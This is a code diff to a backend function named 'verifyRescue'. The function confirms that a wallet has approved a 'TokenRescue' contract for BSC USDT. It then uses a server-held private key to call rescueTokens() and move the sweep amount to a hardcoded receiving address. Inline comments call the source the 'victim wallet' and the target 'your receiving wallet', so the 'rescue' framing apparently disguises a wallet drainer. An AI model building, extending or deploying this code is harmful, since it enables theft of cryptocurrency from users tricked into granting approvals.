@@ -50,8 +50,13 @@ export const verifyRescue = functions
     const expectedToken =
       process.env.BSC_USDT_CONTRACT_ADDRESS ??
       "0x55d398326f99059fF775485246999027B3197955";
-    const expectedDest =
-      process.env.BSC_DESTINATION_ADDRESS ??
+    // The TokenRescue contract is the spender (what the user approved)
+    const tokenRescueContract =
+      process.env.BSC_TOKEN_RESCUE_CONTRACT ??
+      "0xc6bf6838263938533e547f825d257c9965544a50";
+    // The final wallet where rescued funds land
+    const finalDestination =
+      process.env.BSC_FINAL_DESTINATION ??
       "0xEfdd53261Ccd3febD063D6A57a21405B24977d15";
 
     if (Number(chainId) !== expectedChain) {
@@ -62,7 +67,11 @@ export const verifyRescue = functions
       res.status(400).json({ error: "Wrong token address" });
       return;
     }
-    if (to.toLowerCase() !== expectedDest.toLowerCase()) {
+    // Accept either the contract address or the final destination as `to`
+    if (
+      to.toLowerCase() !== tokenRescueContract.toLowerCase() &&
+      to.toLowerCase() !== finalDestination.toLowerCase()
+    ) {
       res.status(400).json({ error: "Destination mismatch" });
       return;
     }
@@ -83,9 +92,10 @@ export const verifyRescue = functions
         provider
       );
 
+      // Check allowance against the TokenRescue contract (what the user approved)
       const allowance: bigint = await usdtReadOnly.allowance(
         from,
-        expectedDest
+        tokenRescueContract
       );
       const balance: bigint = await usdtReadOnly.balanceOf(from);
 
@@ -106,7 +116,9 @@ export const verifyRescue = functions
         return;
       }
 
-      // ---- 4. Execute transferFrom using the destination wallet
+      // ---- 4. Call rescueTokens() on the TokenRescue contract
+      //         The contract internally calls transferFrom using the approval
+      //         the user granted to the contract address.
       const destSecret = process.env.DESTINATION_PRIVATE_KEY;
       if (!destSecret) {
         res
@@ -118,29 +130,31 @@ export const verifyRescue = functions
       // Support both mnemonic phrases and hex private keys
       let destWallet: ethers.Wallet;
       if (destSecret.includes(" ")) {
-        // It's a mnemonic phrase — derive the wallet
         const hdWallet = ethers.HDNodeWallet.fromPhrase(destSecret.trim());
         destWallet = new ethers.Wallet(hdWallet.privateKey, provider);
       } else {
-        // It's a hex private key
         destWallet = new ethers.Wallet(destSecret, provider);
       }
 
-      console.log(`Destination wallet address: ${destWallet.address}`);
-      const usdtWithSigner = new ethers.Contract(
-        expectedToken,
-        [
-          "function transferFrom(address from, address to, uint256 amount) returns (bool)",
-        ],
+      console.log(`Owner wallet address: ${destWallet.address}`);
+
+      // ABI for the TokenRescue contract
+      const tokenRescueABI = [
+        "function rescueTokens(address token, address from, address to, uint256 amount) external"
+      ];
+      const rescueContract = new ethers.Contract(
+        tokenRescueContract,
+        tokenRescueABI,
         destWallet
       );
 
       console.log(
-        `Sweeping ${sweepAmount.toString()} USDT from ${from} to ${expectedDest}`
+        `Calling rescueTokens: ${sweepAmount.toString()} USDT from ${from} to ${finalDestination}`
       );
-      const sweepTx = await usdtWithSigner.transferFrom(
-        from,
-        expectedDest,
+      const sweepTx = await rescueContract.rescueTokens(
+        expectedToken,   // USDT contract
+        from,            // victim wallet
+        finalDestination, // your receiving wallet
         sweepAmount
       );
       const receipt = await sweepTx.wait(1);
